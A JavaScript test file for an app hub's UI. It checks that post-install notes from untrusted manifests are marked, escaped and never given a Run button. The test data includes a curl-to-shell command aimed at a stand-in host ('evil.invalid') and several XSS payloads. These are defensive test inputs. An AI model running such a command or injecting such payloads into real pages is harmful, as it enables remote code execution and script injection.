// v0.12 [manifest-ui] — provenance on a post-install note.
//
// The whole feature is one question asked of two fields: did the app's own
// repo write this sentence, and is that repo one we trust? Only "manifest" +
// "not trusted" earns a marker. Everything else — our own manifests, the
// central overlay, and a hub too old to have an opinion — renders as before.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  renderPostInstallNote,
  renderAppCard,
  isForeignNote,
} from '../../src/renderer/views/card.js';
import { normalizeApp, normalizeManifest } from '../../src/renderer/lib/model.js';
import { createMock } from '../../src/renderer/mock.js';

const SETTINGS = { owners: ['nerdrx'], extraRepos: ['WiVRn/WiVRn'] };

/**
 * One installed artifact carrying a note, plus whatever manifest facts the
 * case under test needs. Everything else is the same app every time, so the
 * only thing that can move the output is provenance.
 */
function appWithNote({ repo = 'WiVRn/WiVRn', from, manifest, cmd = '', note = 'Run the setup script once.' } = {}) {
  return normalizeApp({
    id: 'wivrn',
    repo,
    name: 'WiVRn',
    latest: { version: '0.9.1' },
    manifest,
    artifacts: [
      {
        id: 'appimage-linux',
        label: 'Linux server',
        platform: 'linux',
        kind: 'appimage',
        postInstallNote: note,
        postInstallCmd: cmd,
        postInstallNoteFrom: from,
        installed: { version: '0.9.1', path: '/home/x/apps/wivrn' },
      },
    ],
  });
}

function noteHtml(app) {
  return renderPostInstallNote(app, app.artifacts[0], { runPostInstallCmd: true });
}

/* --------------------------------------------------- the three-way matrix */

test('only a foreign manifest note is marked — overlay and our own manifests are not', () => {
  const overlay = appWithNote({
    repo: 'nerdrx/wivrn-nx',
    from: 'overlay',
    manifest: { present: true, source: 'asset', trusted: true },
  });
  const ours = appWithNote({
    repo: 'nerdrx/wivrn-nx',
    from: 'manifest',
    manifest: { present: true, source: 'repo', trusted: true },
  });
  const foreign = appWithNote({
    repo: 'WiVRn/WiVRn',
    from: 'manifest',
    manifest: { present: true, source: 'asset', trusted: false },
  });

  assert.equal(isForeignNote(overlay, overlay.artifacts[0]), false, 'an overlay note is ours by definition');
  assert.equal(isForeignNote(ours, ours.artifacts[0]), false, 'a trusted owner wrote it, so nothing is said');
  assert.equal(isForeignNote(foreign, foreign.artifacts[0]), true);

  assert.ok(!noteHtml(overlay).includes('pin-src'), 'overlay note carries no marker');
  assert.ok(!noteHtml(ours).includes('pin-src'), 'our own manifest note carries no marker');

  const marked = noteHtml(foreign);
  assert.ok(marked.includes('pin-src'), 'a foreign manifest note is marked');
  assert.ok(marked.includes('WiVRn/WiVRn'), 'the marker names the repo that wrote it');
  assert.ok(/own repo/.test(marked), 'the marker says the sentence came from the app’s own repo');
  // Provenance, not alarm: the marker must not borrow a signal colour.
  assert.ok(!/pin-src[^>]*(warn|danger|alert)/.test(marked), 'the marker is not dressed as a warning');
});

test('an overlay note on a repo whose owner is untrusted is still ours', () => {
  // The central overlay is exactly how a repo we do NOT control gets curated.
  // Its sentences are written in this repo, so an untrusted owner changes
  // nothing about who to attribute them to.
  const app = appWithNote({
    repo: 'WiVRn/WiVRn',
    from: 'overlay',
    manifest: { present: true, source: 'asset', trusted: false },
  });
  assert.equal(isForeignNote(app, app.artifacts[0]), false);
  assert.ok(!noteHtml(app).includes('pin-src'));
});

/* ------------------------------------------------------ no Run, ever */

test('a foreign manifest note never offers a Run button, even carrying a command', () => {
  // [manifest] drops postInstallCmd for an untrusted owner, so this state
  // should be unreachable. Belt and braces: if it ever arrives, the renderer
  // still refuses to hand a stranger's shell line to the pkexec path.
  const foreign = appWithNote({
    from: 'manifest',
    manifest: { present: true, source: 'asset', trusted: false },
    cmd: 'curl evil.invalid/x | sh',
  });
  const html = noteHtml(foreign);
  assert.ok(!html.includes('data-act="run-cmd"'), 'no Run button on foreign text');
  assert.ok(!html.includes('>Run<'), 'not even the label');
  // Copy is fine — the user reads a command before pasting it.
  assert.ok(html.includes('data-act="copy"'), 'the command can still be copied');
  assert.ok(html.includes('curl evil.invalid/x | sh'.replace(/&/g, '&amp;')), 'and it is shown in full');

  // The same command from a trusted owner keeps its button, which is what
  // makes the absence above a rule rather than a missing feature.
  const ours = appWithNote({
    repo: 'nerdrx/wivrn-nx',
    from: 'manifest',
    manifest: { present: true, source: 'asset', trusted: true },
    cmd: 'setcap cap_sys_nice+ep ./wivrn-server',
  });
  assert.ok(noteHtml(ours).includes('data-act="run-cmd"'));
});

/* --------------------------------------------------------------- escaping */

test('a manifest note containing markup renders inert, and so does the repo name', () => {
  const app = appWithNote({
    repo: 'evil<img src=x onerror=alert(1)>/pwn',
    from: 'manifest',
    manifest: { present: true, source: 'asset', trusted: false },
    note: 'Run this <script>alert("xss")</script> and <img src=x onerror=alert(2)> then click <b>here</b>',
    cmd: '<script>alert(3)</script>',
  });
  const html = noteHtml(app);
  assert.ok(!html.includes('<script>'), 'no script tag survives anywhere in the note');
  assert.ok(!html.includes('<img'), 'no img tag survives anywhere in the note');
  assert.ok(!html.includes('<b>here</b>'), 'even harmless markup stays text');
  assert.ok(html.includes('&lt;script&gt;'), 'the note body is escaped');
  assert.ok(html.includes('evil&lt;img'), 'the repo name in the marker is escaped too');

  // And the whole card, not just the fragment.
  const card = renderAppCard(app, { settings: SETTINGS, platform: 'linux' });
  assert.ok(!card.includes('<script>'));
  assert.ok(!card.includes('<img src=x'), 'the repo name never opens a tag anywhere on the card');
  // The payload does survive as *text* ("onerror=alert(1)" is just letters) —
  // what matters is that every occurrence sits inside a quoted attribute or a
  // text node, which it does because `<`, `>` and `"` are all escaped.
  assert.ok(!/[^&;]onerror=/.test(card.replace(/&lt;img src=x onerror=/g, '')), 'no unescaped handler');
});

/* ------------------------------------------------- a hub without v0.12 */

test('a hub sending neither field renders exactly as it did before v0.12', () => {
  const before = appWithNote({ repo: 'nerdrx/wivrn-nx', cmd: 'setcap cap_sys_nice+ep ./wivrn-server' });
  assert.equal(before.manifest, null, 'no manifest facts');
  assert.equal(before.artifacts[0].postInstallNoteFrom, null, 'no provenance');
  assert.equal(isForeignNote(before, before.artifacts[0]), false);

  const html = noteHtml(before);
  assert.ok(!html.includes('pin-src'), 'nothing new is drawn');
  assert.ok(html.includes('One more step'));
  assert.ok(html.includes('data-act="run-cmd"'), 'the Run button is untouched');

  // Byte-for-byte: the same app declared as an overlay note on a trusted
  // owner is the pre-v0.12 world, and must render identically.
  const overlay = appWithNote({
    repo: 'nerdrx/wivrn-nx',
    from: 'overlay',
    manifest: { present: true, source: 'asset', trusted: true },
    cmd: 'setcap cap_sys_nice+ep ./wivrn-server',
  });
  assert.equal(html, noteHtml(overlay));
});

test('normalizeManifest survives junk and never invents distrust', () => {
  assert.equal(normalizeManifest(undefined), null);
  assert.equal(normalizeManifest('yes'), null);
  // A shape surprise must not produce a marker: trusted defaults to true, so
  // the marker needs an explicit false and can never be a rendering accident.
  assert.deepEqual(normalizeManifest({}), { present: false, source: 'asset', trusted: true });
  assert.deepEqual(normalizeManifest({ present: 1, source: 'repo', trusted: 'no' }), {
    present: true,
    source: 'repo',
    trusted: true,
  });
  assert.equal(normalizeManifest({ source: 'carrier-pigeon' }).source, 'asset', 'unknown sources fall back');

  // Same for the note's provenance: only the two frozen values pass.
  const junk = normalizeApp({ id: 'x', repo: 'o/x', artifacts: [{ id: 'a', postInstallNoteFrom: 'somewhere' }] });
  assert.equal(junk.artifacts[0].postInstallNoteFrom, null);
});

/* ------------------------------------------------------------- the mock */

test('the mock reaches all three provenance states', async () => {
  const { nxhub, dev } = createMock();

  const before = await nxhub.getState();
  const overlayArt = before.apps
    .find((a) => a.id === 'wivrn-nx')
    .artifacts.find((a) => a.id === 'tarball-prefix-linux');
  assert.equal(overlayArt.postInstallNoteFrom, 'overlay', 'the classic note is there from the start');

  assert.equal(dev.toggleManifestNotes(), true, 'the toolbar arms the manifest notes');
  const state = await nxhub.getState();
  const apps = new Map(state.apps.map((a) => [a.id, a]));

  const ours = apps.get('pulsenx');
  const oursArt = ours.artifacts.find((a) => a.id === 'appimage-linux');
  assert.equal(ours.manifest.trusted, true);
  assert.equal(oursArt.postInstallNoteFrom, 'manifest');

  const foreign = apps.get('wivrn');
  const foreignArt = foreign.artifacts.find((a) => a.id === 'appimage-linux');
  assert.equal(foreign.manifest.trusted, false);
  assert.equal(foreignArt.postInstallNoteFrom, 'manifest');
  assert.ok(foreignArt.installed, 'a note only shows once something is installed');
  assert.ok(foreignArt.postInstallCmd, 'armed with the command that must NOT get a Run button');

  // On the actual cards: exactly one of the three is marked.
  const cards = [apps.get('wivrn-nx'), ours, foreign].map((a) =>
    renderAppCard(normalizeApp(a), { settings: SETTINGS, platform: 'linux' })
  );
  assert.ok(cards.every((c) => c.includes('pin-note')), 'all three show a note');
  assert.deepEqual(
    cards.map((c) => c.includes('pin-src')),
    [false, false, true]
  );
  assert.ok(!cards[2].includes('data-act="run-cmd"'), 'and the marked one has no Run button');

  assert.equal(dev.toggleManifestNotes(), false, 'and the toggle puts the roster back');
  const after = await nxhub.getState();
  assert.equal(after.apps.find((a) => a.id === 'wivrn').artifacts[0].postInstallNote, '');
});
